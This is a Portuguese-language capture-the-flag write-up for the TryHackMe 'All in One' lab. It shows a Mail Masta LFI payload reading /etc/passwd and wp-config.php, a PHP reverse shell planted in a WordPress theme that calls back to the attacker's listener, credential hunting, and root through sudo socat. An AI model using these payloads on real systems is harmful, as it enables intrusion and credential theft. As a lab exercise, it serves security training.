# Write-up: All in One - TryHackMe

> **Data:** 08 de Março de 2026<br>
> **Target IP:** `10.67.185.79`<br>
> **Attacker IP:** `192.168.145.31`<br>
> **Dificuldade:** Easy

![Status](https://img.shields.io/badge/Status-Comprometimento%20Total-red?style=for-the-badge) 
![Initial Access](https://img.shields.io/badge/Initial%20Access-LFI%20%7C%20Mail%20Masta-orange?style=for-the-badge)
![PrivEsc](https://img.shields.io/badge/PrivEsc-Sudo%20Socat-blue?style=for-the-badge)

A máquina All in One é projetada para testar múltiplas frentes de ataque. Diferente de labs focados em um único serviço, aqui a enumeração é a chave para identificar qual dos vários caminhos (pretendidos ou não) nos levará ao Root.

## Reconhecimento (Recon)
Comecei com o "arroz com feijão" do hacker, executei o RustScan:

```bash
rustscan -a 10.67.185.79 -- -sV -sC -A
```

Porta | Serviço | Versão | Observação Crítica
---|---|---|---
21 | FTP | vsFTpd 3.0.5 | Anonymous login allowed! (Vetor fortíssimo)
22 | SSH | OpenSSH 8.2p1 | Útil para persistência ou login com chaves/senhas.
80 | HTTP | Apache 2.4.41 | Página padrão do Apache. Precisamos de enumeração de diretórios.

### FTP aberto
O resultado confirmou que o login anônimo está habilitado. Muitas vezes, administradores deixam arquivos de configuração, backups ou notas em servidores FTP.

```bash
ftp 10.67.185.79
Connected to 10.67.185.79.
220 (vsFTPd 3.0.5)
Name (10.67.185.79:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

A porta 80 está mostrando apenas uma página simples. Isso quase sempre significa que existem diretórios ou aplicações escondidas

```bash
gobuster dir -u http://10.67.185.79 -w /usr/share/wordlists/dirb/common.txt
```

O scan de diretórios revelou um caminho interessante:

URL: `http://10.67.185.79/wordpress/`

## Ataque ao WordPress
Usando o WPScan, precisamos descobrir quem são os usuários e se há algum "furo" nos plugins.

```bash
wpscan --url http://10.67.185.79/wordpress/ --no-update -e u,vp
```

WPScan confirmou a versão do WordPress (5.5.1) e o usuário elyana.
Acessando o site, podemos ver um nome de um usuário “elyana” em um post que o WPScan já confimou existir e também inspecionando o código fonte consegui constatar que eles estão com um plug mail-mast possivelmente vulnerável

O plugin Mail Masta é famoso por uma vulnerabilidade de LFI (Local File Inclusion)

`http://10.67.185.79/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

O arquivo carregou confirmando o LFI. Para encurtar, filtrei apenas os usuários relevantes com acesso ao bash:
```text
root:x:0:0:root:/root:/bin/bash
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

O resultado confirma os seguintes usuários para o nosso possível shell:

elyana: (UID 1000) - Provavelmente a dona do WordPress.

ubuntu: (UID 1001) - Usuário padrão do sistema.

## Caça às Credenciais
O objetivo agora é ler o arquivo wp-config.php. Ele contém as credenciais do banco de dados MySQL. Geralmente, as pessoas reutilizam a senha do banco de dados para o usuário do sistema (SSH).

`http://10.67.185.79/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php`

Vou usar um PHP Filter para codificar o arquivo em Base64, para o servidor não tentar executar o arquivo e devolver uma página em branco ou de erro.
Vou pegar o resultado e usar este comando para decodificar o base64 e ler as informações obtidas.

```bash
echo "BASE64" | base64 -d
```

Analisando o resultado, tenho as credenciais em texto claro.

Serviço | Usuário | Senha | Origem
---|---|---|---
MySQL / Sistema | elyana | H@ckme@123 | wp-config.php

Como visto no /etc/passwd que a elyana tem uma shell válida, vou tentar o acesso direto por SSH.

```bash
ssh elyana@10.67.185.79
#senha: H@ckme@123
```

Tentativa de acesso via SSH falhou!

Vou tentar acesso direto pelo portal, muito provável que lá dará certo.
Acessando o endereço:

`http://10.67.185.79/wordpress/wp-admin/`

Estou com acesso ao Dashboard do WordPress com privilégios de administrador.

## Reverse Shell
Primeiro de tudo abrir o nc:

```bash
nc -lvnp 4444
```

Para o shell usei o script que já está no kali, fiz uma copia para a pasta do CTF

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/THM/AllInOne
```

Alterei os campos $ip para 192.168.145.31 e $port para 4444.
Acessei a URL `http://10.67.185.79/wordpress/wp-content/themes/twentytwenty/404.php` e obtive a shell com sucesso.

Estabilizando a shell para ficar agradavel para o uso com o comando:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Tentei logar com a usuário elyana e a senha descoberta H@ckme@123, mas não deu certo, nem mesmo com o usuário Ubuntu e a mesma senha.
Executei o classico: sudo -l e foi solicitado uma senha, coloquei a H@ckme@123 e não deu certo também.
Executei o comando em busca de  binários SUID que rodam com a permissão do dono (root).

```bash
find / -perm -4000 2>/dev/null
```

O resultado revelou um suspeito de peso: o /usr/bin/pkexec.

O pkexec é o vetor clássico para o PwnKit (CVE-2021-4034). Esse costuma ser um dos caminhos "não-intencionais"
Vou deixar isso para outro momento, vou procurar a senha da elyana.

Depois de algumas tentativas falhas na busca da senha dela, com esse comando aqui:
```bash
find / -user elyana -type f 2>/dev/null | grep -v "wordpress"
```

Observei um arquivo interessante **private.txt**:
```bash
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
```

E com isso descobri a senha.
Alterei do usuário www-data para elyana. Com isso é buscar a primeira flag user.txt

```bash
cat user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
echo "VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259" | base64 -d
```

Decodifiquei o base64 e obtive a FLAG! 🚩

O `sudo -l` nos mostrou que elyana pode rodar o `/usr/bin/socat` como ROOT sem precisar de senha (NOPASSWD).

E para fechar esse CTF, usei o *GTFOBins* para executar o comando certeiro.

```bash
sudo /usr/bin/socat stdio exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

O socat permite instanciar uma nova shell `/bin/sh ou /bin/bash` herdando as permissões de quem o executou , nesse caso, o *`root`*.

```bash
root@ip-10-67-185-79:/home/elyana#
```

Temos o ROOT! 🚩

**Escrito por:** [Ralph Sonato](https://www.linkedin.com/in/ralph-sonato-77086b16b/)  
*Analista de Cibersegurança*
